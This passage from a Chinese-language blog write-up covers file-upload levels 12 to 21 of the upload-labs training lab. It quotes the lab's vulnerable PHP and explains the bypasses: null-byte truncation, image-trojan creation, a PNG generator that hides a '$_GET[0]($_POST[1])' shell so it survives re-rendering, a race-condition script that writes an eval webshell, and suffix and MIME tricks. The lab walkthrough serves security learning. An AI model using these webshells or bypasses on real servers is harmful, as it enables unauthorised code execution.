class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.ra![](https:<span class="comment">//cdn.nlark.com/yuque/0/2025/png/62156892/1765972093905-116673fb-9be6-43f0-97f5-8b9fdb5a21e5.png)</span></span><br><span class="line"><span class="title function_ invoke__">nd</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">知识补充：</span><br><span class="line">php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到<span class="number">0x00</span>会截断，<span class="number">0</span>x表示<span class="number">16</span>进制，URL中%<span class="number">00</span>解码成<span class="number">16</span>进制就是<span class="number">0x00</span>。</span><br><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find[,start]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,start[,length])函数返回字符串的一部分(从start开始 [，长度为length])</span><br><span class="line">magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对<span class="variable">$_REQUEST</span>, <span class="variable">$_GET</span>,<span class="variable">$_POST</span>,<span class="variable">$_COOKIE</span> 输入的内容进行过滤</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第13题与12题思路一样使用白名单限制上传文件类型，但上传文件的存放路径可控，</span><br><span class="line">但因为是POST型，需要对%00进行解码或在16进制中修改，POST不会像GET那样对%00进行自动解码。</span><br></pre></td></tr></table></figure><p><img src="/Obsidian%E7%9B%B8%E5%85%B3/picture%E4%BB%93%E5%BA%93/3a4ed8aee39666fcbd06372f1bfaa299_MD5.png" alt="null"></p><p><img src="/Obsidian%E7%9B%B8%E5%85%B3/picture%E4%BB%93%E5%BA%93/0684ba1fc69d1a74b8de2940ad5da243_MD5.png" alt="null"></p><p><img src="/Obsidian%E7%9B%B8%E5%85%B3/picture%E4%BB%93%E5%BA%93/c4da8d76207e6fc8da03ea318056e6ca_MD5.png" alt="null"></p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>本关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件<br>使用 <code>图片马 + 文件包含</code> 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">Png图片文件包括<span class="number">8</span>字节：<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A。即为 .PNG</span><br><span class="line">Jpg图片文件包括<span class="number">2</span>字节：FF D8。</span><br><span class="line">Gif图片文件包括<span class="number">6</span>字节：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span>|<span class="number">37</span> <span class="number">61</span> 。即为 <span class="title function_ invoke__">GIF89</span>(<span class="number">7</span>)a。</span><br><span class="line">Bmp图片文件包括<span class="number">2</span>字节：<span class="number">42</span> <span class="number">4</span>D。即为 BM</span><br><span class="line">    </span><br><span class="line">图片马制作：</span><br><span class="line">在cmd里执行 **copy logo.jpg/b+test.php/a test.jpg**</span><br><span class="line"><span class="comment">#logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972093954-00d6da31-6201-442e-b058-fea04808bc80.jpg" alt="null"></p><p>上传完复制文件路径，点击上图黄色的<strong>文件包含漏洞</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094029-cd2471a8-fd72-4922-a159-8772f15022f3.jpg" alt="null"></p><p>分析代码可以知道get传参，参数是file，构造如下图参数<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094117-df2d5ffd-f9f8-4d07-a12b-5753a2e191a0.jpg" alt="null"></p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>查看提示： 本pass使用getimagesize()检查是否为图片文件！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</span><br><span class="line">主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。</span><br></pre></td></tr></table></figure><p>方法同<strong>Pass-14</strong><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094188-a2dff559-1043-4e47-980d-2d090948c0ef.jpg" alt="null"></p><h2 id="less-16（需要开启php-exif模块）"><a href="#less-16（需要开启php-exif模块）" class="headerlink" title="less-16（需要开启php_exif模块）"></a>less-16（需要开启<code>php_exif</code>模块）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype()读取一个图像的第一个字节并检查其后缀名。</span><br><span class="line">返回值与getimage()函数返回的索引2相同，但是速度比getimage快</span><br></pre></td></tr></table></figure><p>方法同<strong>Pass-14</strong></p><p>构造<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094254-76ab827b-393a-4e47-8ddd-0200e5dd068a.jpg" alt="null"><br>一个gif马</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094322-b1535200-2415-4d94-bc57-5fb6898716e8.jpg" alt="null"></p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>二次渲染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">上传→验证→渲染重生成→删除原文件→保存新文件</span><br><span class="line"><span class="number">1</span>. **后缀 + Content-Type 校验可伪造**：`<span class="variable">$fileext</span>`（后缀）和`<span class="variable">$filetype</span>`（Content-Type）都是前端 / 请求头可控的，攻击者可轻易将 PHP 文件伪装为`<span class="number">1</span>.jpg`，并伪造 Content-Type 为`image/jpeg`；</span><br><span class="line"><span class="number">2</span>. **GD 库验证仅 “识别图片”，不 “清理代码”**：`imagecreatefromjpeg/png/gif`的作用是 “判断文件是否为合法图片格式”（只要 GD 库能解析出图片像素，就返回非 <span class="literal">false</span>），但它**不会检查 / 删除图片中嵌入的非图片数据（如 PHP 代码）**；</span><br><span class="line"><span class="number">3</span>. **二次渲染仅 “重绘图片”，不 “清空文件”**：新生成的图片文件（如`<span class="title function_ invoke__">rand</span>().jpg`）会保留上述 “安全区域” 的 PHP 代码 —— 因为 GD 库只重绘像素数据，不会修改注释、EOI 后等非像素区域的内容。</span><br></pre></td></tr></table></figure><p>传less-16的码子不行<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094387-0df8ce81-1faf-475a-80f8-3ee864d2bd8a.jpg" alt="null"></p><p><a href="https://xz.aliyun.com/news/2337#toc-13">upload-labs之pass 16详细分析-先知社区</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094453-5edd10f1-d9a2-4949-9b11-44bb7dde3992.jpg" alt="null"></p><p>加在相同的地方后面<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094517-6f031c0d-c179-4cb5-837d-f5918ca1f843.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php/?file=upload/4520251216222228.gif</span><br></pre></td></tr></table></figure><p>脚本后面再研究研究</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;  </span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;  <span class="comment">// 检查是否提交了上传表单，如果提交了则执行下面的代码块  </span></span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);  <span class="comment">// 定义允许上传的文件类型数组，包括jpg，png，gif  </span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];    <span class="comment">// 从上传表单中获取上传文件的名字  </span></span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];    <span class="comment">// 从上传表单中获取上传文件的临时路径  </span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);  <span class="comment">// 获取上传文件的扩展名，即文件名的最后部分</span></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;  <span class="comment">// 拼接出上传文件的完整路径，创建以原文件名为名的文件    </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;  <span class="comment">// 将临时文件移动到指定的路径，如果移动成功则执行</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;  <span class="comment">// 检查上传文件的扩展名是否在允许的类型数组中，如果在则执行下面的代码块</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>; </span><br><span class="line">            <span class="comment">#生成新的文件名，包括随机数字、当前日期和时间以及原文件的扩展名  </span></span><br><span class="line">            <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);   <span class="comment">// 将上传的文件重命名为新的文件名  </span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  <span class="comment">// 如果上传文件的扩展名不在允许的类型数组中，则设置错误消息，并删除上传的文件  </span></span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;  </span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可通过条件竞争的方式在unlink之前，访问webshell。<br>直接BurpSuite上爆破，或者写脚本都一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094599-394ed243-5b1d-4d01-8350-39852ef3dad3.jpg" alt="null"><br>爆破访问马子路径，利用正在访问的文件不会被删掉的性质<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094669-5a75c777-2e92-4e00-8af5-179f802a7204.jpg" alt="null"></p><p>算了BurpSuite爆破的话是要你一直去访问那个马才不会被删掉，有点蠢了，写脚本好些</p><p><a href="https://xz.aliyun.com/news/12735">条件竞争的骚操作(一)-先知社区</a></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p><strong>同样存在条件竞争</strong></p><p>通过分析源代码发现后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传<strong>图片马</strong>的数据包，由于条件竞争，程序会出现来不及rename的问题，然后再不断通过include.php不断包含上传的文件（注意上传后的文件名：uploadxxx.jpg）从而从而生成木马。</p><p>区别于Pass-18,这里需要使用上一题的php代码生成图片马<br>测试发现重命名后的图片马依旧可以被文件包含，从而生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>Linux环境Windows环境下使用<code>/.</code>绕过，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可知：没有对上传的文件做判断，只对用户输入的文件名做判断，后缀名黑名单<br>上传的文件名用户可控，黑名单用于用户输入的文件后缀名进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094759-c99edb23-63a2-47a4-90e0-a6f7ec08a879.jpg" alt="null"></p><p>这里Windows不要用%00<br>直接用&#x2F;.就可以绕过····<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094824-0d52d853-3c41-40ce-b787-143437e1f9ff.jpg" alt="null"></p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查MIME(修改content-type)<br>判断POST参数save_name是否为空<br>判断$file最后一个元素是否为数组</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094904-089d88e2-0852-40c6-80d1-da4b1aaf67e0.jpg" 